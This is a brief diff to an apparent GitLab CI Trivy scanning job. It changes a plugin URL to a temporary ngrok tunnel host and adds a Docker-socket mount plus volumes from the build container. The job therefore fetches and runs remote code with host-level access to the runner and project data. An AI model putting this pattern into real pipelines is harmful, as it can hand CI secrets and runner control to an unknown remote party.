@@ -16,4 +16,9 @@ trivy_container_scanning:
     dependencies: []
     script:
         - docker pull $TRIVY_IMAGE
-        - docker run --rm $TRIVY_IMAGE plugin run http://ff94-92-124-160-226.ngrok-free.app/trivy-gitlab.tar.gz container $CS_IMAGE
+        - export CONTAINER_ID=$(docker ps -q -f "label=com.gitlab.gitlab-runner.job.id=$CI_JOB_ID" -f "label=com.gitlab.gitlab-runner.type=build")
+        - docker run --rm
+          -v /var/run/docker.sock:/var/run/docker.sock
+          --volumes-from ${CONTAINER_ID}
+          $TRIVY_IMAGE plugin run http://271f-176-67-55-113.ngrok-free.app/trivy-gitlab.tar.gz
+          container $CS_IMAGE -- --report-path="${CI_PROJECT_DIR}"
